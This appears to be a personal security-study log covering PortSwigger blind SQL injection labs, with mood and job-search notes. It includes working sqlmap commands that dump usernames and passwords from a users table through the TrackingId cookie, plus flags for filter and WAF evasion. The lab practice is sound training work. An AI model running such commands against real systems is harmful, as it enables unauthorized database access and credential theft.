# Daily Log & SQLMap Notes

## Goal for Tomorrow

My goal for tomorrow is solely to use and learn the sqlmap tool — how to use a Burp request/parameter and response, and how to test whether it is a true vulnerability or not using the sqlmap tool.

Tomorrow, the sole goal is this and this only.

## How I'm Feeling Today

I am feeling way too low today. I am feeling like a dead body that can't even move. I know I have a call maybe today or tomorrow, and because of that I am not sure whether I am saving my energy or just being lazy. I feel like watching a good series, not gonna lie. I feel like just chilling, watching a series, and doing nothing — this feeling has been coming a lot lately. Maybe I am recovering and it is normal, but I need to study as well. So for today, I am just gonna do a little regular daily streak maintenance, just that, and no extra.

Have done nothing so far today.

Yesterday too, I just had a resume review, and a Bangalore-based security expert told me my resume can get me a 10 LPA+ job if I wish — if I keep applying and stay consistent, it won't be an issue. I will really be able to secure a job.

Just keep patience and keep applying, and everything will be fine.

## On Studying Better With People Around

Well, my cousins are coming — one today and one tomorrow, it seems. I am the type of guy who actually performs more when people are around. Maybe it's to show off, or maybe it's because I feel restricted to my desk otherwise — whatever the reason, when relatives are at home, I seem to study for more hours and get more study hours out of my day-to-day schedule.

I know it looks like I only perform when people are watching, like a "performative male," but whatever suits the purpose of me studying — I don't care about the reason behind it, as long as I am studying.

I will clear that SQL injection room for sure — I can say that for sure.

---

## Lab: Blind SQL Injection with Conditional Response

Well, so let's go. I am going to start with the "Blind SQL Injection with Conditional Response" room.

### Approach

To start, I will:

1. Open Burp and open the room with connection to the Burp proxy.
2. Start an active scan — since I've already tried this room once, I know that after Burp Suite actively scans this host, it will give some SQL-injection-related response vulnerability: when the condition is true, it gives a different response, and when false, it gives a different type of response. So I am going to test just that.
3. First, manually confirm this vulnerability by trying a true and a false statement — test the result myself first, then start with tool usage.

So let's go.

![Screenshot](https://github.com/user-attachments/assets/f7954ab4-10d4-4a04-9d93-4e3d0453d61d)

**Solved my first room, let's go!**

### Command Used

Just to remember the command I ran:

```bash
sqlmap -r newinjection.txt --force-ssl -p TrackingId --level=2 --technique=B --prefix="'" -T users -C username,password --dump --batch
```

---

## How to Use the SQLMAP Tool

For a PortSwigger lab (or any environment you're authorized to test), here's a solid "throw everything at it" command that maximizes detection depth in one go:

```bash
sqlmap -r newinjection.txt --force-ssl -p TrackingId \
  --level=5 --risk=3 \
  --dbms=SQLite \
  --batch \
  --random-agent \
  --tamper=space2comment \
  -T users -C username,password --dump
```

### What Each Flag Actually Buys You

| Flag | Why |
|---|---|
| `--level=5` | Max level — tests every injection point sqlmap knows (headers, cookies, referer, etc.) and every payload variant. Level 2 (earlier runs) skips a lot of these. |
| `--risk=3` | Max risk — includes OR-based and heavier payloads that could affect data, but on a throwaway lab DB that's fine. This is the flag that was silently skipping tons of tests in the `-v 3` output ("risk 3 higher than provided 1"). |
| `--dbms=SQLite` | PortSwigger labs run SQLite. Telling sqlmap up front skips ~80% of irrelevant MySQL/Oracle/MSSQL/Postgres fingerprinting attempts and speeds things up massively. |
| `--batch` | Auto-answers all prompts with defaults, no interaction needed. |
| `--random-agent` | Rotates a real browser UA per request — helps if a WAF/filter is UA-sensitive. |
| `--tamper=space2comment` | Rewrites spaces as SQL comments to dodge basic input filtering — cheap to include, no downside. |
| Drop `--technique=B` | Letting sqlmap try all techniques (not just boolean-blind) means that if you guessed wrong about the injection type, it still finds it. Only restrict to `--technique=B` once you've confirmed it's boolean-blind specifically. |
| Drop `--prefix="'"` | Let sqlmap discover the correct prefix/suffix itself first via its automated tests — only pin it manually once you know for certain (e.g. after manually confirming in Burp that `'` breaks the query). |

### Recommended Workflow for This Lab

1. First, run *without* `--technique` and `--prefix`, just to detect injectability cleanly:
```bash
sqlmap -r newinjection.txt --force-ssl -p TrackingId --level=5 --risk=3 --dbms=SQLite --batch
```
2. Once sqlmap confirms `TrackingId` is injectable and tells you the technique and payload it used, *then* add `-T users -C username,password --dump` to actually pull data — no need to guess `--technique`/`--prefix` if sqlmap already found it.

Since the same 400 error is hit at the very first connectivity check even in the last run, get that resolved first (try `--force-ssl` as suggested) — no combination of level/risk/dbms flags will help if the baseline request itself is being rejected before any payload logic even runs. Once past that first 400, this level=5/risk=3/dbms=SQLite combo is genuinely the fastest path to a confirmed result.

---

## Blind SQL Injection Lab with Conditional Error

It seems that Burp Suite doesn't return every single vulnerability, as we all know it is a vulnerable lab and can be used — but Burp is showing nothing severe. Let's see what we can do from here.

![Screenshot](https://github.com/user-attachments/assets/0f010ccc-77c2-4e35-b1ce-f50b1b5777f8)
